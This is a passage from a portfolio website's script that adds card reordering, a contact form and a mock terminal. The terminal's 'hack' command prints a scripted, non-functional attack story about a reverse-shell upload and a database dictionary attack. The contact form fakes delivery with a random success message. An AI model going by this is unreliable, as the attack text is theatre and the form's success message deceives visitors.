    }

    function saveCardOrder(type) {
        const orderedIndices = [...editCardList.querySelectorAll('.draggable-card-item')].map(item => parseInt(item.dataset.index));
        const originalArray = getArrayForType(type);
        const newArray = orderedIndices.map(index => originalArray[index]);

        // Update the main array for that type
        if (type === 'project') projectsArray = newArray;
        if (type === 'certificate') certificatesArray = newArray;
        if (type === 'blog') blogPostsArray = newArray;

        localStorage.setItem(`${type}sArray`, JSON.stringify(newArray));
        renderAllCards();
        // Repopulate list to update indices
        populateDraggableList(type);
        playBeep();
    }
    
    function renderAllCards() {
        renderProjects();
        renderCertificates();
        renderBlogPosts();
    }


    // --- Contact Form Validation & Feedback ---
    const contactForm = document.getElementById('contact-form');
    const contactSubmitBtn = document.getElementById('contact-submit-btn');
    const contactFormFeedback = document.getElementById('contact-form-feedback');

    function showFeedback(message, type) {
        contactFormFeedback.textContent = message;
        contactFormFeedback.className = `feedback ${type}`; 
        contactFormFeedback.style.display = 'block';
        if (type !== 'loading') {
            setTimeout(() => {
                contactFormFeedback.style.display = 'none';
                contactFormFeedback.className = 'feedback'; 
            }, 5000); 
        }
    }

    contactForm.addEventListener('submit', function(event) {
        event.preventDefault(); 

        const name = document.getElementById('contact-name').value.trim();
        const email = document.getElementById('contact-email').value.trim();
        const message = document.getElementById('contact-message').value.trim();

        if (!name || !email || !message) {
            showFeedback('Please fill in all required fields.', 'error');
            return;
        }

        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            showFeedback('Please enter a valid email address.', 'error');
            return;
        }

        contactSubmitBtn.disabled = true;
        showFeedback('Sending message...', 'loading');

        setTimeout(() => {
            const success = Math.random() > 0.1; 

            if (success) {
                showFeedback('Message sent successfully! Our AI will review your submission shortly.', 'success');
                contactForm.reset(); 
            } else {
                showFeedback('Transmission failed. Please check your network connection and try again.', 'error');
            }
            contactSubmitBtn.disabled = false;
        }, 2000); 
    });

    // --- UPDATED Scroll-triggered animation setup ---
    function initScrollAnimations() {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('is-visible');
                } else {
                    entry.target.classList.remove('is-visible');
                }
            });
        }, { threshold: 0.1 });

        document.querySelectorAll('.content-section').forEach(section => {
            observer.observe(section);
        });
    }
    
    // --- Mini Terminal Shell Logic ---
    function initMiniTerminal() {
        const terminal = document.getElementById('mini-terminal');
        const header = document.getElementById('terminal-header');
        const output = document.getElementById('terminal-output');
        const input = document.getElementById('terminal-input');
        
        let commandHistory = [];
        let historyIndex = -1;

        let isDragging = false;
        let offsetX, offsetY;
        
        header.addEventListener('mousedown', (e) => {
            isDragging = true;
            offsetX = e.clientX - terminal.offsetLeft;
            offsetY = e.clientY - terminal.offsetTop;
            terminal.style.cursor = 'grabbing';
            document.body.style.userSelect = 'none';
        });

        document.addEventListener('mousemove', (e) => {
            if (isDragging) {
                terminal.style.left = `${e.clientX - offsetX}px`;
                terminal.style.top = `${e.clientY - offsetY}px`;
            }
        });

        document.addEventListener('mouseup', () => {
            isDragging = false;
            terminal.style.cursor = 'default';
            document.body.style.userSelect = 'auto';
        });
        
        terminal.addEventListener('click', () => {
            input.focus();
        });
        
        function sanitizeInput(inputStr) {
            const temp = document.createElement('div');
            temp.textContent = inputStr;
            return temp.innerHTML;
        }

        function printToTerminal(text, type = 'output') {
            const line = document.createElement('div');
            if (type === 'command') {
                line.innerHTML = `<span style="color: var(--primary-red);">></span> ${sanitizeInput(text)}`;
            } else if (type === 'neofetch') {
                line.innerHTML = `<pre>${text}</pre>`;
            } else {
                line.innerHTML = text.replace(/\n/g, '<br>');
            }
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }
        
        async function startHackingDemo(target) {
            const scenarios = {
                webserver: [
                    { text: `> Initiating web server scan on ${target}...`, delay: 500 },
                    { text: `> Running Gobuster to find directories...`, delay: 1000 },
                    { text: `> Found: /uploads (Status: 200)`, delay: 1500 },
                    { text: `> Found: /admin (Status: 403)`, delay: 500 },
                    { text: `> Attempting to upload PHP reverse shell to /uploads...`, delay: 1500 },
                    { text: `<span style="color: var(--text-green);">> SUCCESS: File uploaded.</span>`, delay: 1000 },
                    { text: `> Executing shell at ${target}/uploads/shell.php...`, delay: 1000 },
                    { text: `<span style="color: var(--text-green);">> SUCCESS: Reverse shell connection established.</span>`, delay: 1000 },
                    { text: `> whoami: www-data`, delay: 500 },
                    { text: `> Web server compromised.`, delay: 500 },
                ],
                database: [
                    { text: `> Scanning for SQL ports on ${target}...`, delay: 500 },
                    { text: `> Discovered open port 3306/tcp on ${target}`, delay: 1500 },
                    { text: `> Attempting to connect with default credentials (root:root)...`, delay: 1000 },
                    { text: `<span style="color: var(--primary-red);">> FAILED.</span>`, delay: 1000 },
                    { text: `> Starting dictionary attack on user 'admin'...`, delay: 1500 },
                    { text: `> Trying password 'password123'...`, delay: 1000 },
                    { text: `<span style="color: var(--text-green);">> SUCCESS: Password found!</span>`, delay: 1000 },
                    { text: `> Dumping database 'user_data'...`, delay: 1500 },
                    { text: `<span style="color: var(--text-green);">> SUCCESS: Database dumped to /tmp/users.sql.</span>`, delay: 1000 },
                    { text: `> Database compromised.`, delay: 500 },
                ]
            };
            
            const selectedScenario = scenarios[target] || scenarios.webserver;

            for (const step of selectedScenario) {
                await new Promise(resolve => setTimeout(resolve, step.delay));
                printToTerminal(step.text);
                playBeep();
            }
        }


        function executeCommand(cmd) {
            const sanitizedCmd = cmd.trim();
            const parts = sanitizedCmd.toLowerCase().split(' ');
            const command = parts[0];
            const arg = parts.slice(1).join(' ');

            switch (command) {
                case 'help':
                    printToTerminal('Available Commands:\n- help: Show this message\n- ls: List sections\n- cd [section]: Navigate to a section\n- cat [item name]: Display content of a project/cert\n- whoami: Display current user\n- date: Show current date and time\n- echo [message]: Print a message\n- sudo: Request admin privileges\n- neofetch: Display system info\n- hack [webserver|database]: Run a simulated attack\n- clear: Clear the terminal');
                    break;
                case 'ls':
                    printToTerminal('about  skills  projects  certificates  blog  contact');
                    break;
                case 'cd':
                    const section = document.getElementById(arg);
                    if (section) {
                        printToTerminal(`Navigating to #${arg}...`);
                        section.scrollIntoView({ behavior: 'smooth' });
                    } else {
                        printToTerminal(`Error: Section '${arg}' not found.`);
                    }
                    break;
                case 'cat':
                    const allItems = [...projectsArray, ...certificatesArray, ...blogPostsArray];
                    const item = allItems.find(p => p.name?.toLowerCase().replace(/ /g, '-') === arg || p.title?.toLowerCase().replace(/ /g, '-') === arg);
                    if (item) {
                        printToTerminal(`--- Displaying content for ${item.name || item.title} ---\n${item.full_description || item.content}`);
                    } else {
                        printToTerminal(`cat: ${arg}: No such file or directory`);
                    }
                    break;
                case 'clear':
                    output.innerHTML = '';
                    break;
                case 'whoami':
                    printToTerminal('guest');
                    break;
                case 'date':
                    printToTerminal(new Date().toString());
                    break;
                case 'echo':
                    printToTerminal(sanitizeInput(cmd.split(' ').slice(1).join(' ')));
                    break;
                case 'sudo':
                    printToTerminal('Error: User guest is not in the sudoers file. This incident will be reported.');
                    break;
                case 'neofetch':
                    const neofetchArt = `
<span style="color:var(--primary-red)">mostafa@fortress</span>
-----------------
<span style="color:var(--primary-red)">OS:</span> Digital Fortress v2.0 x86_64
<span style="color:var(--primary-red)">Host:</span> Cyber-Portfolio
<span style="color:var(--primary-red)">Kernel:</span> 6.8.0-kali-amd64
<span style="color:var(--primary-red)">Uptime:</span> ${Math.floor(performance.now()/1000/60)} mins
<span style="color:var(--primary-red)">Shell:</span> fortress-sh
<span style="color:var(--primary-red)">CPU:</span> Intel Core i9 (16) @ 5.8GHz
<span style="color:var(--primary-red)">GPU:</span> NVIDIA GeForce RTX 4090
<span style="color:var(--primary-red)">Memory:</span> 128GiB
`;
                    printToTerminal(neofetchArt, 'neofetch');
                    break;
                case 'hack':
                    if(arg === 'webserver' || arg === 'database') {
                        startHackingDemo(arg);
                    } else {
                        printToTerminal('Usage: hack [webserver|database]');
                    }
                    break;
                case 'pwd':
                    printToTerminal('/home/mostafa');
                    break;
                case 'history':
                    printToTerminal(commandHistory.join('\n'));
                    break;
                case 'uname':
                    printToTerminal('Linux fortress 6.8.0-kali-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.8.27-1kali1 (2025-05-12) x86_64 GNU/Linux');
                    break;
                case 'ping':
                    if (arg) {
                        printToTerminal(`Pinging ${arg} with 32 bytes of data:`);
                        setTimeout(() => printToTerminal(`Reply from ${arg}: bytes=32 time=10ms TTL=54`), 1000);
                        setTimeout(() => printToTerminal(`Reply from ${arg}: bytes=32 time=12ms TTL=54`), 2000);
                    } else {
                        printToTerminal('Usage: ping [host]');
                    }
                    break;
                default:
                    printToTerminal(`Error: Command not found: ${command}`);
                    break;
            }
        }

        input.addEventListener('keydown', (e) => {
            const commandList = ['help', 'ls', 'cd', 'cat', 'clear', 'whoami', 'date', 'echo', 'sudo', 'neofetch', 'hack', 'pwd', 'history', 'uname', 'ping'];
            const sectionList = ['about', 'skills', 'projects', 'certificates', 'blog', 'contact'];

            if (e.key === 'Enter') {
                const command = input.value.trim();
                if (command) {
                    printToTerminal(command, 'command');
                    if (command !== commandHistory[0]) {
                        commandHistory.unshift(command);
                    }
                    historyIndex = -1;
                    executeCommand(command);
                    input.value = '';
                }
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    input.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    input.value = commandHistory[historyIndex];
                } else {
                    historyIndex = -1;
                    input.value = '';
                }
            } else if (e.key === 'Tab') {
                e.preventDefault();
                const currentInput = input.value.toLowerCase();
                const parts = currentInput.split(' ');
                const currentCommand = parts[0];
                const partial = parts[parts.length - 1];
                
                let potentialMatches = [];
                if (parts.length === 1) {
                    potentialMatches = commandList.filter(cmd => cmd.startsWith(partial));
                } else if (parts.length > 1 && (currentCommand === 'cd' || currentCommand === 'cat')) {
                     potentialMatches = sectionList.filter(sec => sec.startsWith(partial));
                }

                if (potentialMatches.length === 1) {
                    parts[parts.length - 1] = potentialMatches[0];
                    input.value = parts.join(' ');
                } else if (potentialMatches.length > 1) {
                    printToTerminal(potentialMatches.join('  '));
                }
            }
        });
        
        printToTerminal('Welcome to the Digital Fortress shell.\nType "help" for a list of commands.');
        input.focus();
    }


  </script>
</body>
</html>
